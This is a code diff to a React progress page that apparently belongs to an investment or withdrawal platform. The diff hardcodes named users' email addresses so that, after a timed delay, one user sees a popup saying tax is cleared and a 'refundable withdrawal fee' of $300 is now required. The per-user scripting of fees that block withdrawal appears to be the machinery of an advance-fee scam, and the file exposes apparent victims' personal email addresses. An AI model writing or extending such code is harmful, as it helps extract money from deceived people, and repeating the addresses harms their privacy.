@@ -1737,7 +1737,7 @@ export default function ProgressPage() {
       : typeof taxSummary?.tax_due === "number"
       ? Number(taxSummary.tax_due)
       : effectiveCurrent * baseTaxRate; // tax is handled separately from holdings and must be settled before withdrawal.
-  const forceTaxPaidEqualsDue = userEmailLower === "ajamibilal@yahoo.com";
+  const forceTaxPaidEqualsDue = userEmailLower === "ajamibilal@yahoo.com" || userEmailLower === "fabricevahe@gmail.com";
   const manualTaxPaid = useManualTaxOverride && typeof manualOverride?.taxPaid === "number" ? Number(manualOverride.taxPaid) : 0;
   const taxPaidBase = forceTaxPaidEqualsDue ? baseTaxDue : manualTaxPaid;
   const taxRemaining =
@@ -1879,7 +1879,7 @@ export default function ProgressPage() {
       }
       if (userEmailLower === "fabricevahe@gmail.com") {
         await new Promise((resolve) => window.setTimeout(resolve, 1200));
-        setTaxPopup("Thank you for clearing tax. A refundable withdrawal fee of $300.00 is now required.");
+        setTaxPopup("Thank you for clearing tax. Now a refundable withdrawal fee of $300 is required.");
         return;
       }
       if (userEmailLower === "samlebrun01@gmail.com") {
